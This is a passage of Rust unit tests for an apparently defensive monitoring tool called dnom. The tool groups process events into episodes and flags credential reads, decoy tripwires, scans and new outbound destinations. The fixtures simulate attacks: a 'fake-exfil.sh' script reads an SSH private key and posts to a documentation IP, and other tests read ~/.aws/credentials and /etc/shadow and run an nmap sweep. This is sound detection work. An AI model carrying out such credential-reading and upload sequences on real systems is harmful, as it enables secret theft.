    }

    /// A decoy read marks the episode for policies and the audit record, but the model sees
    /// the file only as an ordinary one, so its answers stay an independent check.
    #[test]
    fn decoy_read_is_recorded_but_hidden_from_the_model() {
        let mut config = Config::default();
        config.paths.decoys = vec!["/srv/backup/db-credentials.txt".into(), "/opt/keys-old/".into()];
        let mut t = Tracker::new(config, Baseline::default(), 0).remote();
        let (sh, cat) = (4_190_501, 4_190_502);
        t.ingest(ev(0, sh, 1000, "sh", exec("/bin/sh", &["sh", "-c", "cat files"])));
        t.ingest(ev(1, sh, 1000, "sh", Data::Fork { child: cat }));
        t.ingest(ev(2, cat, 1000, "cat", exec("/bin/cat", &["cat", "files"])));
        t.ingest(ev(3, cat, 1000, "cat", Data::Open { path: "/srv/backup/db-credentials.txt".into(), flags: 0, write: false }));
        t.ingest(ev(4, cat, 1000, "cat", Data::Open { path: "/opt/keys-old/.ssh/id_rsa".into(), flags: 0, write: false }));
        t.ingest(ev(5, cat, 1000, "cat", Data::Open { path: "/srv/backup/readme.txt".into(), flags: 0, write: false }));

        let ep = &t.episodes[&sh];
        assert!(ep.passes_prefilter(false), "a decoy read alone gets the episode assessed");
        let full = ep.to_json("/root");
        assert_eq!(full["files"]["decoys"], json!(["/opt/keys-old/.ssh/id_rsa", "/srv/backup/db-credentials.txt"]));
        assert_eq!(full["files"]["credentials"], json!(["/opt/keys-old/.ssh/id_rsa"]), "normal category kept");
        assert_eq!(full["other_file_opens"], 2, "the plain-named decoy and the readme");

        let seen = model_view(&full);
        assert!(seen["files"].get("decoys").is_none());
        assert_eq!(seen["files"]["credentials"], full["files"]["credentials"]);
        assert!(!seen.to_string().contains("decoy"), "{seen}");
        assert!(seen.get("trail").is_none() && seen["tree"][0].get("ppid").is_none());
    }

    /// dnom's config lists the decoys and the rules: another program opening it is a signal.
    /// dnom itself (a second `dnom classify`) reading it is not.
    #[test]
    fn own_config_is_a_tripwire_for_other_programs() {
        let mut config = Config::default();
        config.paths.own_config = vec!["/etc/dnom/dnom.yaml".into()];
        let mut t = Tracker::new(config, Baseline::default(), 0).remote();
        t.own_exe = Some("/usr/bin/dnom".into());
        let (sh, cat, dnom) = (4_190_701, 4_190_702, 4_190_703);
        t.ingest(ev(0, sh, 1000, "sh", exec("/bin/sh", &["sh"])));
        t.ingest(ev(1, sh, 1000, "sh", Data::Fork { child: dnom }));
        t.ingest(ev(2, dnom, 1000, "dnom", exec("/usr/bin/dnom", &["dnom", "classify"])));
        t.ingest(ev(3, dnom, 1000, "dnom", Data::Open { path: "/etc/dnom/dnom.yaml".into(), flags: 0, write: false }));
        assert!(t.episodes[&sh].to_json("/root")["files"].get("dnom_config").is_none(), "dnom reading its own config");

        t.ingest(ev(4, sh, 1000, "sh", Data::Fork { child: cat }));
        t.ingest(ev(5, cat, 1000, "cat", exec("/bin/cat", &["cat", "/etc/dnom/dnom.yaml"])));
        t.ingest(ev(6, cat, 1000, "cat", Data::Open { path: "/etc/dnom/dnom.yaml".into(), flags: 0, write: false }));
        let full = t.episodes[&sh].to_json("/root");
        assert_eq!(full["files"]["dnom_config"], json!(["/etc/dnom/dnom.yaml"]));
        assert_eq!(full["trail"][0], json!({ "ts_ms": 6, "pid": cat, "event": "open", "path": "/etc/dnom/dnom.yaml", "category": "dnom_config", "write": false }));
        assert!(model_view(&full)["files"].get("dnom_config").is_none());
    }

    /// A scan: many connection attempts, one of them to a decoy address, late. The hit must
    /// survive the per-episode network cap and the trail cap, and stay out of the model's view.
    #[test]
    fn decoy_address_hit_survives_a_scan() {
        let mut config = Config::default();
        config.decoys.addresses = vec!["10.43.0.200".into(), "127.0.0.1:6379".into()];
        let mut t = Tracker::new(config, Baseline::default(), 0).remote();
        let scan = 4_190_801;
        t.ingest(ev(0, scan, 1000, "nmap", exec("/usr/bin/nmap", &["nmap", "10.43.0.0/24"])));
        for host in 1..=254u64 {
            t.ingest(ev(host, scan, 1000, "nmap", Data::Net { op: "connect".into(), dest: format!("10.43.0.{host}:22") }));
        }
        t.ingest(ev(300, scan, 1000, "nmap", Data::Net { op: "connect".into(), dest: "127.0.0.1:6379".into() }));
        t.ingest(ev(301, scan, 1000, "nmap", Data::Net { op: "connect".into(), dest: "127.0.0.1:6380".into() }));

        let ep = &t.episodes[&scan];
        let full = ep.to_json("/root");
        assert_eq!(full["decoy_destinations"], json!(["10.43.0.200:22", "127.0.0.1:6379"]));
        assert_eq!(full["network"].as_array().unwrap().len(), NET_CAP, "the ordinary list still stops at its cap");
        let decoy_steps: Vec<&str> =
            full["trail"].as_array().unwrap().iter().filter(|s| s["decoy"] == true).map(|s| s["dest"].as_str().unwrap()).collect();
        assert_eq!(decoy_steps, ["10.43.0.200:22", "127.0.0.1:6379"], "both hits are in the trail, past its cap");
        assert!(model_view(&full).get("decoy_destinations").is_none());

        // The hit alone gets an episode assessed, also from an ignored program.
        let mut config = Config::default();
        config.decoys.addresses = vec!["10.43.0.200".into()];
        config.ignore = vec![crate::config::IgnoreRule { name: "tool".into(), exe: Some("/opt/tool".into()), exe_prefix: None, comm: None, argv_contains: None }];
        let mut t = Tracker::new(config, Baseline::default(), u64::MAX).remote();
        t.ingest(ev(0, scan, 1000, "tool", exec("/opt/tool", &["tool"])));
        t.ingest(ev(1, scan, 1000, "tool", Data::Net { op: "connect".into(), dest: "10.43.0.9:22".into() }));
        assert!(!t.episodes.contains_key(&scan), "an ignored program's ordinary connections stay ignored");
        t.ingest(ev(2, scan, 1000, "tool", Data::Net { op: "connect".into(), dest: "10.43.0.200:5432".into() }));
        let ep = &t.episodes[&scan];
        assert!(ep.passes_prefilter(false) && ep.flags.contains("sensitive_in_ignored_tree"));
        assert_eq!(ep.to_json("/root")["decoy_destinations"], json!(["10.43.0.200:5432"]));
    }

    /// The audit trail says which process did what, in order, and the tree knows parents.
    #[test]
    fn trail_and_tree_parents() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (sh, cat, curl) = (4_190_601, 4_190_602, 4_190_603);
        t.ingest(ev(10, sh, 1000, "sh", exec("/bin/sh", &["sh", "x.sh"])));
        t.ingest(ev(11, sh, 1000, "sh", Data::Fork { child: cat }));
        t.ingest(ev(12, cat, 1000, "cat", exec("/bin/cat", &["cat", "/home/a/.ssh/id_ed25519"])));
        for ts in [13, 14] {
            t.ingest(ev(ts, cat, 1000, "cat", Data::Open { path: "/home/a/.ssh/id_ed25519".into(), flags: 0, write: false }));
        }
        t.ingest(ev(15, cat, 1000, "cat", Data::Open { path: "/home/a/notes.txt".into(), flags: 0, write: false }));
        t.ingest(ev(16, sh, 1000, "sh", Data::Fork { child: curl }));
        t.ingest(ev(17, curl, 1000, "curl", exec("/usr/bin/curl", &["curl", "https://203.0.113.7/"])));
        t.ingest(ev(18, curl, 1000, "curl", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));

        let json = t.episodes[&sh].to_json("/home/a");
        let tree: Vec<(u64, Option<u64>, u64)> =
            json["tree"].as_array().unwrap().iter().map(|n| (n["pid"].as_u64().unwrap(), n["ppid"].as_u64(), n["ts_ms"].as_u64().unwrap())).collect();
        assert_eq!(tree, vec![(sh as u64, None, 10), (cat as u64, Some(sh as u64), 12), (curl as u64, Some(sh as u64), 17)]);
        assert_eq!(
            json["trail"],
            json!([
                { "ts_ms": 13, "pid": cat, "event": "open", "path": "~/.ssh/id_ed25519", "category": "credentials", "write": false },
                { "ts_ms": 18, "pid": curl, "event": "net", "dest": "203.0.113.7:443", "new_destination": true },
            ]),
            "one step per process and target; uncategorized opens are only counted"
        );
    }

    fn exec(exe: &str, argv: &[&str]) -> Data {
        Data::Exec { exe: exe.into(), argv: argv.iter().map(|s| s.to_string()).collect() }
    }

    fn open(path: &str) -> Data {
        Data::Open { path: path.into(), flags: 0, write: false }
    }

    /// Seen on a public server: every connection is an sshd that reads its host keys and
    /// /etc/shadow, every cron job a cron child that reads /etc/shadow. Recorded, not assessed.
    #[test]
    fn daemons_reading_their_own_files_are_routine() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        let (listener, conn, cron, job) = (4_191_001, 4_191_002, 4_191_003, 4_191_004);
        t.ingest(ev(0, listener, 0, "sshd", exec("/usr/sbin/sshd", &["sshd", "-D"])));
        t.ingest(ev(1, listener, 0, "sshd", Data::Fork { child: conn }));
        t.ingest(ev(2, conn, 0, "sshd", exec("/usr/sbin/sshd", &["/usr/sbin/sshd", "-D", "-R"])));
        t.ingest(ev(3, conn, 0, "sshd", open("/etc/ssh/ssh_host_ed25519_key")));
        t.ingest(ev(4, conn, 0, "sshd", open("/etc/shadow")));
        t.ingest(ev(5, conn, 0, "sshd", Data::Net { op: "connect".into(), dest: "0.0.0.0:22".into() }));
        let ep = &t.episodes[&conn];
        assert!(ep.only_routine_reads() && !ep.passes_prefilter(false), "sshd and its own files");
        assert_eq!(ep.to_json("/root")["files"]["credentials"], json!(["/etc/shadow", "/etc/ssh/ssh_host_ed25519_key"]), "still on record");

        // A cron job: the child that reads /etc/shadow never execs, it is still cron.
        t.ingest(ev(10, cron, 0, "cron", exec("/usr/sbin/cron", &["/usr/sbin/cron", "-f", "-P"])));
        t.ingest(ev(11, cron, 0, "cron", Data::Fork { child: job }));
        t.ingest(ev(12, job, 0, "cron", open("/etc/shadow")));
        assert!(!t.episodes[&job].passes_prefilter(false), "cron and /etc/shadow");
        assert_eq!(t.routine_episodes(), 2);

        // Closed without assessment, they stay counted; the count is what a run reports.
        t.gc(1_000_000, 1000, 600_000);
        assert!(t.episodes.is_empty());
        assert_eq!(t.routine_episodes(), 2);
    }

    /// The exemption is narrow: the same file read by another program, another sensitive file,
    /// a write, a decoy, a new destination or a container, and the episode is assessed in full.
    #[test]
    fn anything_beyond_a_routine_read_is_assessed() {
        let sshd_reads = |t: &mut Tracker, pid: u32, path: &str| {
            t.ingest(ev(0, pid, 0, "sshd", exec("/usr/sbin/sshd", &["/usr/sbin/sshd", "-D", "-R"])));
            t.ingest(ev(1, pid, 0, "sshd", open(path)));
        };
        let pid = 4_191_101;

        // Another program reads the daemon's file.
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        t.ingest(ev(0, pid, 0, "cat", exec("/usr/bin/cat", &["cat", "/etc/shadow"])));
        t.ingest(ev(1, pid, 0, "cat", open("/etc/shadow")));
        assert!(t.episodes[&pid].passes_prefilter(false), "cat is not sshd");

        // A program that only carries the daemon's name.
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        t.ingest(ev(0, pid, 0, "sshd", exec("/tmp/sshd", &["sshd"])));
        t.ingest(ev(1, pid, 0, "sshd", open("/etc/shadow")));
        assert!(t.episodes[&pid].passes_prefilter(false), "matched by full path, not by name");

        // The daemon reads something that is not its own, next to its routine reads.
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        sshd_reads(&mut t, pid, "/etc/shadow");
        assert!(!t.episodes[&pid].passes_prefilter(false));
        t.ingest(ev(2, pid, 0, "sshd", open("/root/.aws/credentials")));
        let ep = &t.episodes[&pid];
        assert!(ep.passes_prefilter(false) && !ep.only_routine_reads());
        assert_eq!(ep.to_json("/root")["files"]["credentials"], json!(["/etc/shadow", "~/.aws/credentials"]), "routine reads included");
        assert_eq!(t.routine_episodes(), 0);

        // A write is never routine.
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        t.ingest(ev(0, pid, 0, "sshd", exec("/usr/sbin/sshd", &["/usr/sbin/sshd", "-D", "-R"])));
        t.ingest(ev(1, pid, 0, "sshd", Data::Open { path: "/etc/shadow".into(), flags: 1, write: true }));
        assert!(t.episodes[&pid].passes_prefilter(false), "sshd writing /etc/shadow");

        // A decoy placed on a routine path still trips.
        let mut config = Config::default();
        config.paths.decoys = vec!["/etc/ssh/ssh_host_dsa_key".into()];
        let mut t = Tracker::new(config, Baseline::default(), u64::MAX).remote();
        sshd_reads(&mut t, pid, "/etc/ssh/ssh_host_dsa_key");
        assert!(t.episodes[&pid].passes_prefilter(false), "a decoy is a tripwire for everyone");

        // Routine reads count again once the episode contacts a new destination
        // (learning is over here, so the destination is new).
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        t.baseline.exes.insert("/usr/sbin/sshd".into());
        sshd_reads(&mut t, pid, "/etc/shadow");
        assert!(!t.episodes[&pid].passes_prefilter(false));
        t.ingest(ev(2, pid, 0, "sshd", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
        let ep = &t.episodes[&pid];
        assert!(ep.flags.contains("new_destination") && ep.passes_prefilter(false), "credentials, then a new destination");

        // In a container nothing is routine.
        let mut t = Tracker::new(Config::default(), Baseline::default(), u64::MAX).remote();
        t.ingest(in_container(ev(0, pid, 0, "sshd", exec("/usr/sbin/sshd", &["/usr/sbin/sshd", "-D", "-R"])), "web", None));
        t.ingest(in_container(ev(1, pid, 0, "sshd", open("/etc/shadow")), "web", None));
        assert!(t.episodes[&pid].passes_prefilter(false), "a container's root can replace its sshd");

        // Built-ins can be switched off.
        let config: Config = serde_saphyr::from_str("routine: {include_defaults: false}").unwrap();
        let mut t = Tracker::new(config, Baseline::default(), u64::MAX).remote();
        sshd_reads(&mut t, pid, "/etc/shadow");
        assert!(t.episodes[&pid].passes_prefilter(false));
    }

    /// A deploy tool polls its repository: git starts ssh, ssh reads the deploy key. With the
    /// key listed as a credential and as ssh's own file, the poll is routine, also inside an
    /// ignored tree; anything else reading the key is not.
    #[test]
    fn custom_routine_read_inside_a_larger_tree() {
        let yaml = r#"
paths:
  credentials: [/var/lib/app/keys/]
routine:
  reads:
    - name: deploy-key
      exe: /usr/bin/ssh
      paths: [/var/lib/app/keys/]
"#;
        let poll = |t: &mut Tracker, reader_exe: &str| {
            let (app, git, ssh) = (4_191_201, 4_191_202, 4_191_203);
            t.ingest(ev(0, app, 0, "app", exec("/usr/local/bin/app", &["app", "serve"])));
            t.ingest(ev(1, app, 0, "app", Data::Fork { child: git }));
            t.ingest(ev(2, git, 0, "git", exec("/usr/bin/git", &["git", "fetch", "origin"])));
            t.ingest(ev(3, git, 0, "git", Data::Fork { child: ssh }));
            t.ingest(ev(4, ssh, 0, "ssh", exec(reader_exe, &["ssh", "-i", "/var/lib/app/keys/deploy", "git@example.org"])));
            t.ingest(ev(5, ssh, 0, "ssh", open("/var/lib/app/keys/deploy")));
            app
        };
        let config = || serde_saphyr::from_str::<Config>(yaml).unwrap();

        let mut t = Tracker::new(config(), Baseline::default(), u64::MAX).remote();
        let app = poll(&mut t, "/usr/bin/ssh");
        let ep = &t.episodes[&app];
        assert!(ep.only_routine_reads() && !ep.passes_prefilter(false), "ssh reading its deploy key");

        let mut t = Tracker::new(config(), Baseline::default(), u64::MAX).remote();
        let app = poll(&mut t, "/usr/bin/cat");
        assert!(t.episodes[&app].passes_prefilter(false), "anything else reading the key");

        // The same poll under an ignore rule: the routine read raises no flag, the other does.
        let ignored = || {
            let mut c = config();
            c.ignore = vec![crate::config::IgnoreRule { name: "app".into(), exe: Some("/usr/local/bin/app".into()), exe_prefix: None, comm: None, argv_contains: None }];
            c
        };
        let mut t = Tracker::new(ignored(), Baseline::default(), u64::MAX).remote();
        let app = poll(&mut t, "/usr/bin/ssh");
        assert!(!t.episodes.contains_key(&app), "ignored tree, routine read: nothing to record");
        let mut t = Tracker::new(ignored(), Baseline::default(), u64::MAX).remote();
        let app = poll(&mut t, "/usr/bin/cat");
        assert!(t.episodes[&app].flags.contains("sensitive_in_ignored_tree"));
    }

    #[test]
    fn custom_rules_reach_outbound_episode() {
        let config: Config = serde_saphyr::from_str(r#"
paths:
  credentials: [/opt/app/session]
redact:
  secret_names: [APP_SESSION]
"#).unwrap();
        let mut t = Tracker::new(config, Baseline::default(), u64::MAX);
        let pid = 4_190_010;
        t.ingest(ev(1, pid, 1000, "app", exec("/opt/app/bin/app", &["app", "APP_SESSION=example-secret"])));
        t.ingest(ev(2, pid, 1000, "app", Data::Open { path: "/opt/app/session".into(), flags: 0, write: false }));
        let ep = &t.episodes[&pid];
        assert!(ep.passes_prefilter(false));
        let json = ep.to_json("/home/test");
        assert_eq!(json["files"]["credentials"][0], "/opt/app/session");
        assert_eq!(json["root"]["argv"], "app APP_SESSION=[redacted]");
        assert!(!json.to_string().contains("example-secret"));
    }

    #[test]
    fn local_destinations_are_never_new() {
        for local in ["0.0.0.0:22", "[::]:22", "127.0.0.53:53", "[::1]:8009"] {
            assert!(is_local_dest(local), "{local}");
        }
        for remote in ["203.0.113.7:443", "[2001:db8::1]:443", "10.0.0.12:22"] {
            assert!(!is_local_dest(remote), "{remote}");
        }
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let sshd = 4_190_201;
        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session"])));
        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "0.0.0.0:22".into() }));
        t.ingest(ev(2, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
        let net = &t.episodes[&sshd].net;
        assert_eq!(net.len(), 2, "local destinations are still recorded");
        assert!(!net[0].new && net[1].new);
    }

    /// Who drives an episode comes from the process tree and stays out of the model's view.
    #[test]
    fn episodes_are_labelled_with_their_driver() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let driver = |t: &Tracker, root: u32| t.episodes[&root].to_json("/root")["driver"].clone();
        let start = |t: &mut Tracker, parent: u32, pid: u32, comm: &str, exe: &str, argv: &[&str]| {
            t.ingest(ev(0, parent, 1000, "", Data::Fork { child: pid }));
            t.ingest(ev(1, pid, 1000, comm, exec(exe, argv)));
        };
        let (systemd, foot, bash, make, claude, tool, git) = (4_191_001, 4_191_002, 4_191_003, 4_191_004, 4_191_005, 4_191_006, 4_191_007);
        start(&mut t, 1, systemd, "systemd", "/usr/lib/systemd/systemd", &["systemd", "--user"]);
        start(&mut t, systemd, foot, "foot", "/usr/bin/foot", &["foot"]);
        start(&mut t, foot, bash, "bash", "/usr/bin/bash", &["bash"]);

        // Typed in a terminal.
        start(&mut t, bash, make, "make", "/usr/bin/make", &["make", "test"]);
        assert_eq!(driver(&t, make), json!({ "kind": "human", "by": "bash in foot" }));

        // An agent started from that shell, and the commands it runs.
        start(&mut t, bash, claude, "claude", "/home/u/.local/bin/claude", &["claude"]);
        start(&mut t, claude, tool, "bash", "/usr/bin/bash", &["bash", "-c", "git status"]);
        start(&mut t, tool, git, "git", "/usr/bin/git", &["git", "status"]);
        assert_eq!(driver(&t, claude), json!({ "kind": "agent", "by": "claude" }));
        assert_eq!(t.procs[&git].driver.kind, Kind::Agent);
        assert!(!t.episodes.contains_key(&git), "the agent's commands stay in its episode");

        // An agent started by a script turns that script's episode into an agent's.
        let codex = 4_191_008;
        start(&mut t, make, codex, "codex", "/usr/bin/codex", &["codex", "exec", "fix the tests"]);
        assert_eq!(driver(&t, make), json!({ "kind": "agent", "by": "codex" }));

        // A system service: started by pid 1.
        let service = 4_191_010;
        start(&mut t, 1, service, "bash", "/usr/bin/bash", &["bash", "/usr/bin/snapshot-sync"]);
        assert_eq!(driver(&t, service), json!({ "kind": "automation", "by": "pid 1" }));

        // A desktop timer.
        let (shell_bar, meter) = (4_191_011, 4_191_012);
        start(&mut t, systemd, shell_bar, "quickshell", "/usr/bin/quickshell", &["quickshell"]);
        start(&mut t, shell_bar, meter, "bash", "/bin/bash", &["bash", "/usr/bin/usage-update"]);
        assert_eq!(driver(&t, meter), json!({ "kind": "automation", "by": "quickshell" }));

        // A command sent over SSH: someone on another machine.
        let (sshd, session, remote) = (4_191_020, 4_191_021, 4_191_022);
        start(&mut t, 1, sshd, "sshd", "/usr/sbin/sshd", &["sshd", "-D"]);
        start(&mut t, sshd, session, "sshd-session", "/usr/lib/openssh/sshd-session", &["sshd-session: admin@notty"]);
        start(&mut t, session, remote, "bash", "/usr/bin/bash", &["bash", "-c", "cat ~/.aws/credentials"]);
        assert_eq!(driver(&t, remote), json!({ "kind": "remote", "by": "sshd-session" }));

        // Parents never seen.
        let orphan = 4_191_030;
        t.ingest(ev(2, orphan, 1000, "python3", exec("/usr/bin/python3", &["python3", "x.py"])));
        assert_eq!(driver(&t, orphan), json!({ "kind": "unknown" }));

        assert!(model_view(&t.episodes[&claude].to_json("/root")).get("driver").is_none());
    }

    #[test]
    fn interactive_shell_detection() {
        let v = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        for interactive in [&["bash"][..], &["-bash"], &["/usr/bin/bash"], &["bash", "-l"], &["zsh", "-i", "--login"], &[]] {
            assert!(is_interactive_shell_argv(&v(interactive)), "{interactive:?}");
        }
        for not in [&["bash", "-c", "ls"][..], &["bash", "-lc", "ls"], &["bash", "./script.sh"], &["sh", "x.sh", "-e"]] {
            assert!(!is_interactive_shell_argv(&v(not)), "{not:?}");
        }
    }

    /// `ssh vm 'cd ~/dnom && ./scripts/fake-exfil.sh'`: sshd-session starts `bash -c`, which
    /// execs into the script under the same pid. Its children (cat, curl) must stay in the
    /// script's episode, not become separate "typed commands".
    #[test]
    fn script_under_sshd_is_one_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (sshd, script, cat, curl) = (4_190_101, 4_190_102, 4_190_103, 4_190_104);
        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session: lab@notty"])));
        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Fork { child: script }));
        t.ingest(ev(2, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "-c", "cd ~/dnom && ./scripts/fake-exfil.sh"])));
        t.ingest(ev(3, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "./scripts/fake-exfil.sh"])));
        t.ingest(ev(4, script, 1000, "bash", Data::Fork { child: cat }));
        t.ingest(ev(5, cat, 1000, "cat", exec("/usr/bin/cat", &["cat", "/tmp/x/.ssh/id_ed25519"])));
        t.ingest(ev(6, cat, 1000, "cat", Data::Open { path: "/tmp/x/.ssh/id_ed25519".into(), flags: 0, write: false }));
        t.ingest(ev(7, script, 1000, "bash", Data::Fork { child: curl }));
        t.ingest(ev(8, curl, 1000, "curl", exec("/usr/bin/curl", &["curl", "https://203.0.113.7/upload"])));
        t.ingest(ev(9, curl, 1000, "curl", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
        let ep = &t.episodes[&script];
        assert_eq!(ep.files["credentials"].len(), 1);
        assert_eq!(ep.net.len(), 1, "curl's connection belongs to the script's episode");
        assert!(!t.episodes.contains_key(&curl) && !t.episodes.contains_key(&cat));

        // An interactive login shell under sshd still splits typed commands.
        let (shell, ls) = (4_190_111, 4_190_112);
        t.ingest(ev(10, sshd, 0, "sshd-session", Data::Fork { child: shell }));
        t.ingest(ev(11, shell, 1000, "bash", exec("/usr/bin/bash", &["-bash"])));
        t.ingest(ev(12, shell, 1000, "bash", Data::Fork { child: ls }));
        t.ingest(ev(13, ls, 1000, "ls", exec("/usr/bin/ls", &["ls"])));
        assert!(t.episodes.contains_key(&ls), "a typed command is its own episode");
    }

    /// A shell known only from its parent's fork must not show up as root (uid 0).
    #[test]
    fn forked_child_inherits_uid_and_events_set_it() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0);
        // Pids far above any real ones, so /proc lookups find nothing.
        let (term, shell, cmd) = (4_190_001, 4_190_002, 4_190_003);
        t.ingest(ev(0, term, 1000, "foot", exec("/usr/bin/foot", &["foot"])));
        t.ingest(ev(1, term, 1000, "foot", Data::Fork { child: shell }));
        t.ingest(ev(2, shell, 1000, "bash", Data::Fork { child: cmd }));
        // First event from `cmd` creates the shell only as its ancestor (no event of its own).
        t.ingest(ev(3, cmd, 1000, "cat", exec("/usr/bin/cat", &["cat", "x"])));
        assert_eq!(t.procs[&shell].uid, 1000);
        assert_eq!(t.procs[&cmd].uid, 1000);
        assert_eq!(t.episodes[&cmd].root_uid, 1000);

        // A later event with a different real uid (after setuid) updates it.
        t.ingest(ev(4, cmd, 0, "cat", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }));
        assert_eq!(t.episodes[&cmd].root_uid, 0);
    }
}
